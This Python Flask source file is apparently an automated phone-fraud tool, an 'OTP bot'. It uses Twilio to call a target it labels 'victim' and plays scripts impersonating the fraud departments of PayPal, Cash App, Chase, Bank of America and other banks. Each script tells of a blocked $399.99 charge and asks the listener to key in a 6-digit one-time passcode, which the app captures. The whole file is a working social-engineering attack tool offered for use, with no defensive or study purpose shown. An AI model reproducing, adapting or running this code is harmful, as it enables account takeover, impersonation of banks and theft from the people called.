import os
from flask import Flask, render_template, request, redirect, url_for, flash, send_from_directory
from werkzeug.utils import secure_filename
from twilio.rest import Client
from twilio.twiml.voice_response import VoiceResponse, Gather
from dotenv import load_dotenv

load_dotenv()

UPLOAD_FOLDER = os.path.join(os.path.dirname(__file__), 'uploads')
ALLOWED_EXTENSIONS = {'mp3', 'wav'}
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

TWILIO_ACCOUNT_SID = os.getenv("TWILIO_ACCOUNT_SID")
TWILIO_AUTH_TOKEN = os.getenv("TWILIO_AUTH_TOKEN")
TWILIO_CALLER_ID = os.getenv("TWILIO_CALLER_ID")

app = Flask(__name__)
app.secret_key = os.getenv("SECRET_KEY", "supersecretkey")
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

twilio_client = Client(TWILIO_ACCOUNT_SID, TWILIO_AUTH_TOKEN)

PRESET_SCRIPTS = {
    "paypal": """Hello, this is an automated message from the PayPal Fraud Prevention Department. We have detected suspicious activity on your account.\nAn unauthorized transaction attempt for $399.99 has been initiated from your account to an unknown recipient. For your security, this transaction has been temporarily blocked.\nIf this transaction was initiated by you, please press 1 now to confirm and release the hold, or simply hang up the call.\nIf this was not you, please stay on the line to speak with a fraud specialist who will assist you in securing your account.\nThank you for staying on the line. To verify your identity and reverse this unauthorized attempt, we are sending a 6-digit one-time verification code to the phone number associated with your PayPal account, ending in {phone_last4}.\nPlease provide the 6-digit OTP code now by speaking it clearly or entering it on your keypad.""",
    "cash_app": """Hello, this is an automated alert from Cash App Security. We have detected unusual activity on your account.\nAn unauthorized transaction attempt for $399.99 has been made from your Cash App balance to an unknown recipient. This has been blocked for your protection.\nIf this was you, press 1 to confirm or hang up now.\nIf not, stay on the line to connect with a security agent.\nThank you. For verification, we're sending a 6-digit code to your linked phone. Please provide the OTP now.""",
    "chime": """Hello, this is Chime Fraud Alerts calling. Suspicious activity has been flagged on your Chime account.\nAn attempt to transfer $399.99 to an unauthorized party has been stopped.\nIf authorized by you, press 1 or end the call.\nOtherwise, remain on the line for assistance.\nTo secure your account, a 6-digit verification code is being sent to your phone. Enter or speak the OTP.""",
    "venmo": """Hi, this is Venmo Fraud Protection. We've spotted potential fraud on your account.\nA $399.99 payment attempt to an unknown user has been halted.\nIf this was you, press 1 or hang up.\nIf not, stay connected for help.\nWe're texting a 6-digit code to your number. Please share the OTP to verify.""",
    "chase": """Hello, this is Chase Fraud Services. We have identified suspicious activity.\nAn unauthorized charge of $399.99 has been attempted and blocked.\nPress 1 if this was you, or hang up.\nStay on if unauthorized.\nA 6-digit OTP is being sent to your registered phone. Provide the code now.""",
    "bank_of_america": """This is Bank of America Fraud Detection. Alert: Unusual transaction detected.\nA $399.99 debit attempt has been prevented.\nIf initiated by you, press 1 or disconnect.\nOtherwise, hold for a specialist.\nSending a 6-digit verification code to your phone. Enter the OTP.""",
    "wells_fargo": """Hello from Wells Fargo Fraud Prevention. We've blocked suspicious activity.\nAn unauthorized $399.99 transfer has been stopped.\nPress 1 if yours, or hang up.\nStay for assistance if not.\nA 6-digit code is en route to your phone. Provide the OTP.""",
    "american_express": """This is American Express Card Security. Fraud alert on your account.\nA $399.99 charge attempt has been denied.\nIf authorized, press 1 or end call.\nRemain if unauthorized.\nWe're sending a 6-digit OTP to your mobile. Share the code.""",
    "first_national_credit_union": """Hello, this is First National Credit Union Fraud Team. Account alert.\nAn unauthorized $399.99 withdrawal has been blocked.\nPress 1 if you, or hang up.\nHold if not.\nA 6-digit verification code is being sent. Enter OTP.""",
    "desert_financial_credit_union": """Hi from Desert Financial Credit Union Security. Suspicious activity detected.\nA $399.99 transaction attempt halted.\nIf yours, press 1 or disconnect.\nStay on if not.\nSending 6-digit OTP to your phone. Provide code.""",
    "us_bank": """This is US Bank Fraud Alerts. We've flagged an issue.\nUnauthorized $399.99 charge blocked.\nPress 1 if authorized, or hang up.\nHold for help.\n6-digit code sent to your number. Enter OTP.""",
    "citi_bank": """Hello, Citi Bank Fraud Prevention calling. Account compromise suspected.\n$399.99 transfer attempt stopped.\nIf you, press 1 or end.\nStay if not.\nOTP code texted. Share 6 digits.""",
    "capital_one": """What's in your wallet? This is Capital One Fraud Alert. Suspicious transaction.\n$399.99 attempt blocked.\nPress 1 if yours, hang up.\nHold otherwise.\n6-digit verification to your phone. Provide OTP.""",
    "pnc_bank": """This is PNC Bank Fraud Services. Alert on your account.\nUnauthorized $399.99 debit prevented.\nIf initiated by you, press 1 or disconnect.\nStay for assistance.\nSending 6-digit OTP. Enter code.""",
}

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

@app.route("/", methods=["GET", "POST"])
def dashboard():
    if request.method == "POST":
        victim_name = request.form.get("victim_name")
        victim_phone = request.form.get("victim_phone")
        bank = request.form.get("bank")
        script_type = request.form.get("script_type", "preset")
        custom_script_text = request.form.get("custom_script_text")
        preset_script_key = request.form.get("preset_script_key")
        audio_file_url = None

        # Handle file upload
        if script_type == "audio":
            file = request.files.get("audio_file")
            if file and allowed_file(file.filename):
                filename = secure_filename(file.filename)
                filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
                file.save(filepath)
                audio_file_url = url_for('uploaded_file', filename=filename, _external=True)
            else:
                flash("Invalid file type. Only MP3 and WAV are allowed.", "danger")
                return redirect(url_for("dashboard"))

        # Prepare script text
        script_text = ""
        if script_type == "preset":
            script_template = PRESET_SCRIPTS.get(preset_script_key, "")
            phone_last4 = victim_phone[-4:] if len(victim_phone) >= 4 else "XXXX"
            script_text = script_template.format(
                victim_name=victim_name,
                victim_phone=victim_phone,
                phone_last4=phone_last4,
                bank=bank
            )
        elif script_type == "custom":
            script_text = custom_script_text

        # Initiate Twilio call
        try:
            call = twilio_client.calls.create(
                to=victim_phone,
                from_=TWILIO_CALLER_ID,
                url=url_for('voice', script_type=script_type, script_text=script_text, audio_url=audio_file_url, _external=True)
            )
            flash("Call initiated successfully!", "success")
            return render_template("call_result.html", call_sid=call.sid)
        except Exception as e:
            flash(f"Error initiating call: {e}", "danger")
            return redirect(url_for("dashboard"))

    return render_template("dashboard.html", preset_scripts=PRESET_SCRIPTS)

@app.route("/voice", methods=["POST", "GET"])
def voice():
    script_type = request.args.get("script_type")
    script_text = request.args.get("script_text")
    audio_url = request.args.get("audio_url")

    response = VoiceResponse()
    if script_type == "audio" and audio_url:
        response.play(audio_url)
    elif script_text:
        response.say(script_text)
    else:
        response.say("Default script.")

    # Gather OTP
    gather = Gather(num_digits=6, action=url_for('gather_otp', _external=True), method="POST")
    gather.say("Please enter your 6-digit one time password now.")
    response.append(gather)
    response.say("We did not receive your input. Goodbye.")
    return str(response)

@app.route("/gather_otp", methods=["POST"])
def gather_otp():
    digits = request.values.get("Digits", "")
    response = VoiceResponse()
    if digits and len(digits) == 6:
        response.say("Thank you. Our team is now processing this to secure your account. Do not share this code with anyone. Goodbye.")
    else:
        response.say("I'm sorry, I didn't catch that. Please repeat the 6-digit code.")
        gather = Gather(num_digits=6, action=url_for('gather_otp', _external=True), method="POST")
        gather.say("Please enter your 6-digit one time password now.")
        response.append(gather)
    return str(response)

@app.route('/uploads/<filename>')
def uploaded_file(filename):
    return send_from_directory(app.config['UPLOAD_FOLDER'], filename)

if __name__ == "__main__":
    app.run(debug=True)
